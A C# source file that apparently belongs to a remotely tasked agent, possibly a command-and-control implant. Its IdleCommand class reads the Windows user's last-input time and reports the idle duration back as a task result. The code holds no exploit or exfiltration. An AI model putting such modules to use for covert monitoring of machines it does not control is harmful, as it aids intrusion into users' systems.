using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class IdleCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Idle;
       

        internal struct LASTINPUTINFO
        {
            public uint cbSize;

            public uint dwTime;
        }

        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        public static TimeSpan GetIdleTime()
        {
            DateTime bootTime = DateTime.UtcNow.AddMilliseconds(-Environment.TickCount);
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(lastInPut);
            GetLastInputInfo(ref lastInPut);

            DateTime lastInputTime = bootTime.AddMilliseconds(lastInPut.dwTime);
            var utcnow = DateTime.UtcNow;
            var res = utcnow.Subtract(lastInputTime);
            return res;
        }
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            var timespan = GetIdleTime();
            context.AppendResult($"Idle for {timespan.Hours}:{timespan.Minutes}:{timespan.Seconds}");
        }
    }
}
